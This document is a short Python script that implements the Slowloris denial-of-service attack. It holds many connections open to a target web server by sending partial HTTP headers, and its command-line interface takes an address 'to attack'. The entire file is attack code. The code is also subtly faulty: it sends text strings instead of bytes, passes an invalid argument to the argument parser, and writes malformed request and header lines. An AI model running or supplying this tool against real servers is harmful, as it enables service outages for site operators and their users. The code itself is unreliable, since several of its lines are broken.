"""
This is a simple python implementation of slow loris attack.
Slow Loris only works on Apache servers, since it pops a thread for every new
client.
"""

import time
import socket
import random
import argparse


# Headers to be sent at the beginning of the connection.
HEADERS = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) \
     Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)",
    "Accept-language: en-US"
]

def init_socket(ip_address):
    """ Inits a socket and sends the first headers. It also sends the start
    of the request.
    """
    sock = socket.create_connection((ip_address, 80), timeout=4)

    for header in HEADERS:
        try:
            sock.send(header)
        except InterruptedError as error:
            print("Socket error:\n%s\n Killing socket" % error)
            sock.close()
            sock = None
            break
    if sock:
        try:
            sock.send("GET /?%d /HTTP1.0" % random.randint(1, 5000))
        except InterruptedError as error:
            print("Socket error, killing socket")
            sock.close()
            sock = None
    return sock

def send_header(sock):
    """ Sends a chunk of header to the server to keep it waiting.
    """
    if sock:
        try:
            sock.send("X-a: %d" %  random.randint(1, 5000))
        except InterruptedError as error:
            print("Socket error:\n%s\n killing socket" % error)
            sock.close()
            LIST_OF_SOCKETS.remove(sock)

def slow_loris(ip_address, sock_number=200):
    """ Implements the attack. Creates the given number of sockets, and manages
    it, recreating socket if necessary.
    It assumes that the ip is not none, and that sock_number is a positive
    number.
    """
    for _ in range(sock_number):
        sock = init_socket(ip_address)
        if sock:
            LIST_OF_SOCKETS.append(sock)
            print("Created socket %d" % len(LIST_OF_SOCKETS))

    while True:
        for sock in LIST_OF_SOCKETS:
            send_header(sock)
        for _ in range(sock_number - len(LIST_OF_SOCKETS)):
            sock = init_socket(ip_address)
            if sock:
                LIST_OF_SOCKETS.append(sock)
                print("Recreating socket...")
        time.sleep(15)
    return 0

if __name__ == "__main__":

    # Manages the list of sockets
    LIST_OF_SOCKETS = []

    DESCRIPTION = "Attacks the web server at the given IP \
                   with the Slow Loris attack"
    PARSER = argparse.ArgumentParser(description=DESCRIPTION)
    PARSER.add_argument(
        "ip",
        type=str,
        action="store",
        metavar="ADDRESS",
        help="The address or hostname to attack"
    )
    PARSER.add_argument(
        "-n", "--number",
        description="Number of sockets to open (default=200)",
        action="store",
        type=int
    )

    ARGS = PARSER.parse_args()
    slow_loris(ARGS.ip, ARGS.number)